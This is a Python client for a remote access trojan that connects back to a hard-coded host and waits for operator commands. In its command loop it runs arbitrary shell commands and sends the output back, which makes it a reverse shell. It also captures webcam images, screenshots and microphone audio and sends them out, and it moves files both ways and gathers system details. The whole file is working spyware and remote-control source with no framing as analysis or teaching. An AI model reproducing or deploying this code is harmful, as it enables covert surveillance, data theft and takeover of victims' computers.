import socket
import subprocess
import os
import pyautogui
import pyaudio
import wave
import pygame
import pygame.camera
import random
import platform
import pyfiglet
import webbrowser
import time
import ctypes
import shutil
import math
# a python library to change terminal text color
from colorama import Fore, Style
# python library to turn on microphone and record sound
import sounddevice
from scipy.io.wavfile import write
import wavio

host = '192.168.88.152'
port = 9999
MESSAGE_SAPARATOR = '<split>'

if platform.system() == 'Windows':
    os.system('cls')
if platform.system() == 'Linux':
    subprocess.run('clear')

def create_socket():
    # using try-except method
    global client_socket
    try:
        client_socket = socket.socket()
    except socket.gaierror as socket_creation_error:
        print('somenthing went wrong creating client socket ' + socket_creation_error)
        time.sleep(0.2)

def connect_to_server():
    # using try-except method
    try:
        client_socket.connect((host, port))
        client_socket.send(str(socket.gethostname()).encode('utf-8'))
    except socket.gaierror as connection_error:
        print('somenthing went wrong creating client socket ' + connection_error)
        time.sleep(0.2)
        raise
    return

def client_info():
    current_dir = os.getcwd()
    client_socket.send(current_dir.encode('UTF-8'))
    print(current_dir)

def Client_Response(client_response):
    client_socket.send(client_response.encode('utf-8'))

def command_zone():
    while True:
        try:
            revsiv = client_socket.recv(1024).decode("UTF-8")
        except:
            return
        if revsiv[:2] == 'cd':
            directory = revsiv[3:]
            try:
                os.chdir(directory.strip())
                client_socket.send(os.getcwd().encode('UTF-8'))
            except Exception as e:
                output_str = "Could not change directory: %s\n" % str(e)
                client_socket.send(output_str.encode('UTF-8'))

        elif revsiv[:] == 'quit':
            client_socket.close()
            break            

        # execute query search in webbrowser
        elif revsiv == "browse":
            # using try-except method
            try:
                # receiving query sent from server
                search_query = client_socket.recv(10000000000).decode('UTF-8')
                # opening browser and running the query
                webbrowser.open_new(search_query)
                client_response = "Query Sent to Client's Browser Successfully"
            except Exception as e:
                client_response = "something went wrong on the client code: " + str(e)
            Client_Response(client_response)


        # a script to set a background image to a remote device
        elif revsiv == "background":
            # using try-except method
            try:
                # receive full path of the image file from the server
                IMAGE_PATH = client_socket.recv(10000000000).decode("UTF-8")
                # check if the image file exists on the client machine
                if os.path.exists(IMAGE_PATH):
                    # using try-except method
                    try:
                        SPI_SETDESKWALLPAPER = 20
                        # Call the SystemParametersInfo function to set the desktop wallpaper
                        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, IMAGE_PATH, 0)
                        client_response = "Background Image Set Successfully"
                    except Exception as e:
                        client_response = "Background Image is Not Changed on the client machine " + str(e)
                else:
                    # if the file doesn't exists on the client machine
                    client_response = str(os.path.basename(IMAGE_PATH)) + " doesn't exists on the client machine"
            except Exception as e:
                client_response = "something went wrong on the client code: " + str(e)
            Client_Response(client_response)


        # a script to retrieve machine info and send to the server
        elif revsiv == "info":
            # creating a "platform.uname()" object
            __system = platform.uname()
            # creating shutil "disk_usage('/) function object"
            __disk = shutil.disk_usage("/")
            # appending all client system info into a list
            SYSTEM_INFO = f'{__system.system}{MESSAGE_SAPARATOR}{__system.node}{MESSAGE_SAPARATOR}{__system.release}{MESSAGE_SAPARATOR}{__system.version}{MESSAGE_SAPARATOR}{__system.machine}{MESSAGE_SAPARATOR}{__system.processor}{MESSAGE_SAPARATOR}'
            DISK_INFO = f'{round(__disk.total/(1024**3))} GB {MESSAGE_SAPARATOR}{round(__disk.free/(1024**3))} GB {MESSAGE_SAPARATOR}{round(__disk.used/(1024**3))} GB {MESSAGE_SAPARATOR}'
            DEVICE_INFO = SYSTEM_INFO + DISK_INFO
            client_socket.send(DEVICE_INFO.encode('UTF-8'))

        elif revsiv == 'webcam':
            # using try-except method
            try:
                # initializing the camera
                pygame.camera.init()
                # make the list of all available cameras
                camlist = pygame.camera.list_cameras()
                # if camera is detected or not
                if camlist:
                    # send camera detectiuon alert to server
                    client_response = True
                    Client_Response(str(client_response))
                    # initializing the cam variable with default camera
                    cam = pygame.camera.Camera(camlist[0], (800, 780))
                    # opening the camera
                    cam.start()
                    # capturing the single image
                    image = cam.get_image()
                    # saving the image
                    image_name = str(random.randrange(1, 1000000)) + ".jpg"
                    pygame.image.save(image, image_name)
                    cam.stop()
                    client_socket.send(str.encode(image_name))
                    with open(image_name, "rb") as file:
                        image_data=file.read(10000000000)
                        client_socket.send(image_data)
                    file.close()
                    os.remove(image_name)
                else:
                    client_response = False
                    Client_Response(str(client_response))
            except Exception as e:
                continue

        elif revsiv == "screenshot":
            # using try-except method
            try:
                im1 = pyautogui.screenshot()
                # saving the image
                im1.save(r"screenshot.png")
                with open("screenshot.png", "rb") as file:
                    image_data=file.read(10000000000)
                    client_socket.sendall(image_data)
                file.close()
                os.remove('screenshot.png')
            except Exception as e:
                continue

        
        elif revsiv == "upload":
            # using try-except method
            try:
                filename = client_socket.recv(1024).decode()
                file_chunk = client_socket.recv(10000000000)
                with open(filename, "wb") as file_upload_obj:
                    file_upload_obj.write(file_chunk)
                file_upload_obj.close()
            except Exception as e:
                continue

        elif revsiv == 'download':
            filename = client_socket.recv(1024).decode("UTF-8")
            # check if the targte file is found on the directory
            if os.path.isfile(filename):
                with open(filename, "rb") as file:
                    client_response = True
                    Client_Response(str(client_response))
                    # get the file size
                    filesize = os.path.getsize(filename)
                    file_size = round(filesize/pow(10, 3))
                    client_socket.send(str(file_size).encode('UTF-8'))
                    file_data=file.read(10000000000)
                    client_socket.send(file_data)
            # send FileNotFoundError exception to the server
            else:
                client_response = False
                Client_Response(str(client_response))

        elif revsiv == 'record':
            # using try-except method
            try:
                # Sampling frequency
                FREQUENCY = 44100
                # Recording duration
                DURATION = int(client_socket.recv(1024).decode('UTF-8'))
                # Start recorder with the given duration and sample frequency
                RECORDING = sounddevice.rec(int(DURATION * FREQUENCY),
                                            samplerate=FREQUENCY, channels=2)
                # Record sound for "DURATION" number of seconds
                sounddevice.wait()
                # defining Filename
                FILE_RECORD = "Remote_Record" + str(random.randrange(1, 1000000)) + ".wav"
                # sending audio filename to the server socket
                client_socket.send(FILE_RECORD.encode('UTF-8'))
                # This will convert the NumPy array to an audio and save the file
                write(FILE_RECORD, FREQUENCY, RECORDING)
                # start sending audio file bytes
                with open(FILE_RECORD, 'rb') as AUDIO_FILE:
                    AUDIO_BYTES = AUDIO_FILE.read(10000000000)
                    client_socket.send(AUDIO_BYTES)
                # close file object
                AUDIO_FILE.close()
                os.remove(FILE_RECORD)
            except Exception as e:
                continue
            
        elif len(revsiv) > 0:
            try:
                command = subprocess.Popen(revsiv[:], shell=True, stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result_bytes = command.stdout.read() + command.stderr.read()
                result_str = result_bytes.decode("utf-8", errors="replace")
                client_socket.send(result_str.encode('UTF-8'))
            except Exception as e:
                # TODO: Error description is lost
                output_str = "Command execution unsuccessful: %s\n" % str(e)
        else:
            pass

if __name__ == "__main__":
    while True:
        create_socket()
        while True:
            try:
                connect_to_server()
            except Exception as e:
                print("Error on socket connections: %s" %str(e))
                time.sleep(2)     
            else:
                break
        client_info()
        command_zone()